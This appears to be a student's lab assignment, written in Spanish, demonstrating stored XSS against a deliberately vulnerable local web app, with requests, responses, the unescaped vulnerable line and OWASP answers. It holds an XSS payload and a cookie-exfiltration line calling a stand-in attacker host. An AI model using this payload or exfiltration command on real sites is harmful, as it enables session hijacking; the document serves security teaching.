@@ -1,0 +1,43 @@
+=== TAREA 1.2 — DEMOSTRACIÓN XSS ALMACENADO ===
+Alumno: Omar Rivera Castillo | Código: 2221895826
+
+PASO 1 — Login como carlos:
+  Solicitud: POST http://localhost:5001/login
+             username=carlos&password=Carlos456!
+  Respuesta: HTTP 200
+  Body:      {'mensaje': 'Bienvenido carlos', 'user_id': 2}
+  NOTA: La respuesta expone user_id=2 (facilita enumeracion de IDs para IDOR).
+
+PASO 2 — Inyectar payload XSS como comentario:
+  Solicitud: POST http://localhost:5001/comentario/nuevo
+  Payload:   <img src=x onerror=alert(document.cookie)>
+  Respuesta: HTTP 200 — {'mensaje': 'Comentario guardado'}
+  El servidor acepta el contenido sin ninguna validacion ni sanitizacion.
+
+PASO 3 — Ver HTML fuente de /comentarios:
+  Solicitud: GET http://localhost:5001/comentarios
+  HTML fuente completo devuelto por el servidor:
+
+<html><body><h1>Comentarios</h1><div>Bienvenidos al foro seguro</div><div><img src=x onerror=alert(document.cookie)></div></body></html>
+
+ANALISIS DE VULNERABILIDAD:
+  XSS_EN_HTML_SIN_ESCAPAR = True   (debe ser True)
+
+  La etiqueta <script> aparece directamente en el HTML sin ninguna transformacion.
+  Un navegador que visite esta pagina ejecutaria el JavaScript inmediatamente.
+  Con SESSION_COOKIE_HTTPONLY=False, document.cookie devuelve la cookie de sesion,
+  permitiendo al atacante robarla con fetch('https://atacante.com?c='+document.cookie).
+
+  Linea vulnerable (app_vulnerable.py):
+    html += f"<div>{c['contenido']}</div>"   <- sin html.escape()
+
+PREGUNTAS RESPONDIDAS:
+  1. Categoria OWASP: A03:2021 - Injection (Cross-Site Scripting Almacenado)
+
+  2. Se llama XSS Almacenado (Persistente) porque el payload se guarda en la BD
+     y se sirve a TODOS los usuarios que visiten /comentarios. El XSS Reflejado
+     solo afecta al usuario que envia la peticion manipulada (no persiste en servidor).
+
+  3. Todos los visitantes de /comentarios ejecutarian el script: medicos,
+     administradores y pacientes. Un atacante real robaria las cookies de sesion
+     de todos ellos con un solo comentario malicioso, obteniendo acceso a sus cuentas.
